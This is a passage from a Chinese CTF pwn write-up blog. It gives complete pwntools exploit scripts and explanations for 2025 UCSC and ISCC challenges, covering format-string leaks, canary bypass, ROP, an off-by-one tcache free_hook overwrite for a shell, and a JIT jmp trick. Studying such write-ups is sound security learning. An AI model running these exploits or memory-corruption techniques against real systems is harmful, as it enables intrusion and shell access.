class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;39.107.58.236:45010&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x04012B0</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, 1)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Password: &quot;</span>, <span class="string">&quot;supersecureuser&quot;</span>) <span class="comment">#调用printf</span></span><br><span class="line"><span class="comment"># 构造格式化字符串Payload</span></span><br><span class="line">payload = <span class="string">b&#x27;%22$p_%23$p&#x27;</span>  <span class="comment"># 分隔符用于区分两个字符串</span></span><br><span class="line"><span class="comment"># pwndbg(0, bps, 1)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Write Something\n&quot;</span>, payload) <span class="comment">#调用printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的字符串</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">str1 = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">str2 = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># str1 = hex(str1)</span></span><br><span class="line"><span class="comment"># str2 = hex(str2)</span></span><br><span class="line"><span class="comment"># put(str1)</span></span><br><span class="line"><span class="comment"># put(str2)</span></span><br><span class="line"></span><br><span class="line">passwd = (<span class="built_in">int</span>.to_bytes(str1, <span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) +</span><br><span class="line">          <span class="built_in">int</span>.to_bytes(str2, <span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)).decode().strip(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put(passwd)</span><br><span class="line">backdoor = <span class="number">0x00401265</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Password: &quot;</span>, passwd)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(backdoor)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Note: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>题目里面给的格式化字符串有32字节呢，似乎可以直接用格式化字符串来修改返回地址，但是我没有尝试，因为我感觉直接泄露密码打溢出更加简单，如果有师傅尝试了可以评论区和我分享一下<code>(￣▽￣)</code></p><h3 id="疯狂复制"><a href="#疯狂复制" class="headerlink" title="疯狂复制"></a><strong>疯狂复制</strong></h3><p>2.27的堆题，给的版本是<code>Ubuntu GLIBC 2.27-3ubuntu1.6</code><br>给的漏洞是在<code>edit</code>中有<code>off-by-one</code>我们可以利用这个漏洞来<code>修改chunk的size位</code>以此来<code>造成堆块重叠</code><br><img src="/../picture/2025UCSCCTFpwn-wp/4.png"><br><img src="/../picture/2025UCSCCTFpwn-wp/5.png"><br>要问怎么看出<code>off-by-one</code>, 我认为与其看出来不如直接上gdb申请一个chunk，比如申请一个0x10的chunk然后我们使用edit功能看看能不能输入0x11个字符以此来确定是否有溢出，答案是肯定的</p><p>这道题也很常规就是利用<code>tcachebin</code>没有任何保护，去申请到<code>free_hook</code>上，修改<code>free_hook</code>为<code>system</code>，然后随便找个块写入 <code>/bin/sh</code> 字符串，随后用free释放它即可拿到shell</p><p>所以我们的首要目标就是获取libc基地址，所以我的第一步是填满了<code>0x90</code>大小的<code>tcachebin</code>使得堆块能够进入到<code>unsortedbin</code>中然后再申请出来，从而得到libc地址</p><p>将chunk放入unsortedbin中<br><img src="/../picture/2025UCSCCTFpwn-wp/6.png"><br>将chunk切割一部分取出<br><img src="/../picture/2025UCSCCTFpwn-wp/7.png"><br>最后就可以我们切割出来的chunk里面有libc地址了<br><img src="/../picture/2025UCSCCTFpwn-wp/8.png"></p><p>这里可能有的师傅有个小疑问，为什么原本里面是<code>0x7ffff7bebca0</code> 但是切割出来的却是 <code>0x00007ffff7bebd20</code><br>这是因为我们申请<code>add(0x18)</code>之后堆块里面没有找到合适的<code>chunk</code>，然后原本在<code>unsortedbin</code>中的<code>chunk</code>就会先放入<code>smallbin</code>中，然后进行切割，切割出的0x20给用户，剩余的部分放回<code>unsortedbin</code>中，这个过程看起来很像是直接从<code>unsortedbi</code>n中切割，其实并不是<br><img src="/../picture/2025UCSCCTFpwn-wp/9.png"><br><img src="/../picture/2025UCSCCTFpwn-wp/10.png"><br>总之就是可以泄露libc地址了，然后就是申请几个0x38大小的<code>chunk</code>，然后利用<code>off-by-one</code>修改其中一个的<code>size位</code>，然后释放它再申请它，就可以造成堆块重叠，然后释放它的<code>高地址chunk</code>进入<code>tcachebin</code>，我们可以利用它来控制<code>高地址chunk</code>的<code>next指针</code><br>然后就…就没啥好说的，常规套路</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/home/xidp/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;39.107.58.236:42651&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x09B5</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="comment"># pwndbg(1, bps, 1)</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;:&quot;</span>  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">    sdla(<span class="string">&quot;Size &quot;</span>, <span class="built_in">str</span>(size))  <span class="comment"># size不能大于0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">    sdla(<span class="string">&quot;Content: &quot;</span>, content)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, 1)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_offset = uu64()</span><br><span class="line">leak(<span class="string">&quot;libc_offset&quot;</span>)</span><br><span class="line">libc_base = libc_offset - <span class="number">0x3EBD20</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;malloc_hook&quot;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system_addr&#x27;</span>)</span><br><span class="line">one = [<span class="number">0x4f29e</span>, <span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">3</span>]</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span> + p8(<span class="number">0x71</span>))</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">11</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">41</span>) + p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">13</span>, p64(system_addr))</span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;/bin/sh\x00\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>题目相对简单，也是成功AK了</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 ISCC 练武赛Pwn-wp(含附件)</title>
      <link href="/2025/06/13/2025%20ISCC%20%E7%BB%83%E6%AD%A6%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/"/>
      <url>/2025/06/13/2025%20ISCC%20%E7%BB%83%E6%AD%A6%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年个人赛报名了忘记打了(笑), 所以这应该算是我第一次参加ISCC, 体验也是差到没边了<br>主办方也是非常幽默，pwn和web都是公用容器，那web最后都被当成玩具玩坏了<br>下面是这次练武题pwn方向所有附件<br>通过网盘分享的文件：2025ISCC练武赛Pwn全部附件.rar<br>链接: <a href="https://pan.baidu.com/s/1aDBEOZ4XESb6yfCrCI5Wgg?pwd=xidp">https://pan.baidu.com/s/1aDBEOZ4XESb6yfCrCI5Wgg?pwd=xidp</a> 提取码: xidp</p><h2 id="解出"><a href="#解出" class="headerlink" title="解出"></a>解出</h2><h3 id="genius"><a href="#genius" class="headerlink" title="genius"></a>genius</h3><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/1.png"></p><p>先后输入 <code>no</code> 和 <code>thanks</code> 最终进入 <code>function3函数</code> 中，这里存在两个溢出，一个是 <code>read溢出</code>，一个是 <code>gets溢出</code><br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/2.png"><br>我们注意到read溢出下面有一个pritnf输出，所以我们可以通过read来覆盖掉canary结尾的<code>\x00</code>使得canary被pritnf输出，然后再利用gets溢出打ROP，注意程序已经为我们提供了 <code>backdoor</code><br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/3.png"></p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:12000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">back_door = <span class="number">0x004011A6</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span><span class="comment">#: ret;</span></span><br><span class="line">io.sendline(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;thanks&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;faaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(back_door)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/4.png"></p><h3 id="Fufu"><a href="#Fufu" class="headerlink" title="Fufu"></a>Fufu</h3><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/5.png"></p><p>选择1，利用整数溢出绕过检查，获得 <code>格式化字符串</code> 和 <code>read溢出</code>，利用 <code>格式化字符串</code> 获得 <code>程序基地址</code>，<code>libc地址</code>， <code>canary的值</code>，然后正常打ROP即可<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/6.png"></p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:12600&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x01237</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line">sdla(<span class="string">b&quot;Furina: Your choice? &gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">sdla(<span class="string">b&quot;Furina: Time is limited! &gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">429496730</span>))</span><br><span class="line">rcu(<span class="string">&quot;Furina: Present your evidence! &gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_addr_offset = 11</span></span><br><span class="line"><span class="comment"># canary_offset = 17</span></span><br><span class="line"><span class="comment"># main_addr_offset = 25</span></span><br><span class="line">payload = <span class="string">b&quot;%11$p_%17$p_%25$p&quot;</span></span><br><span class="line">sdl(payload)</span><br><span class="line"></span><br><span class="line">rcu(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">346</span></span><br><span class="line">rcu(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">rcu(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;main_addr&quot;</span>)</span><br><span class="line">elf_base = main_addr - <span class="number">0x1338</span></span><br><span class="line">leak(<span class="string">&quot;elf_base&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.symbols[&quot;puts&quot;]</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.symbols[&quot;system&quot;]</span></span><br><span class="line"><span class="comment"># binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = elf_base + <span class="number">0x000000000000132f</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">ret = elf_base + <span class="number">0x000000000000101a</span><span class="comment">#: ret;</span></span><br><span class="line"></span><br><span class="line">payload = p64(canary) * <span class="number">11</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">sdla(<span class="string">b&quot;hcy want to eat chicken! &gt;&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/7.png"></p><h3 id="mutsumi"><a href="#mutsumi" class="headerlink" title="mutsumi"></a>mutsumi</h3><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/8.png"></p><p>整个程序主要分为三个流程，在<code>main函数</code>中按照固定格式不断读取数据，在<code>mutsumi_jit函数</code>中堆读取的数据进行分析，最后<code>run_vm函数</code>会跳转到0x114000(存放解析后指令的地址执行程序)</p><p>固定的格式有三种：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxx,ido</span><br><span class="line">to</span><br><span class="line">&lt;人名&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxxx,ido</span><br><span class="line">&lt;数字&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saki,ido</span><br><span class="line">stop</span><br><span class="line"><span class="comment">// 这里必须是saki才可以stop</span></span><br></pre></td></tr></table></figure><p>第一种在漏洞利用中没有用到<br>第二种就是按照这个格式输入数字，最后这个数字会被存在堆中，在程序停止接收输入后进入到mutsumi_jit函数函数后会被解析为对应的jmp指令<br>第三种就是告诉程序停止接收输入，注意第三种开头必须是saki否则程序会强制退出，具体如下<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/9.png"></p><p>题目的漏洞点在 <code>main -&gt; mutsumi_jit -&gt; imm2asm</code> 这个函数中<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/10.png"></p><p>简单来说这个程序就是 <code>imm2asm(number， &amp;len)</code><br>如果 <code>number &gt; 255</code> 那么就返回 <code>jmp number</code><br>如果 <code>number &lt; 255</code> 那么就返回 <code>jmp rip+number</code></p><p>那么我们的利用方法是这样的<br>我们先输入一个 <code>1</code> 那么得到 <code>jmp rip+1</code><br>然后输入我们想要的指令的字节码(必须是4字节，不为四字节用\x90补齐) 得到 <code>jmp xxxxx(我们的指令)</code><br>由于rip是指向下一条指令的地址，那么rip+1就是下一条指令去掉第一个开头的指令，也就是去掉了jmp的指令，那么就变成了我们输入的指令<br>我们可以使用<code>gdb调试</code>和<code>pwndbg的x/50i 指令</code>来验证</p><p>将程序运行此处，查看执行的汇编代码<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/11.png"><br>查看我们输入的内容<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/12.png"></p><p>从这里我们就可以看到 我们0x114003的下面本该是从0x114005开始执行，但是却跳到了0x114006<br>如何就导致这个指令从<code>jmp xxxx</code>变成了<code>xor al,0x3b;</code><br>由此我们可以实现我们的ret2syscall</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 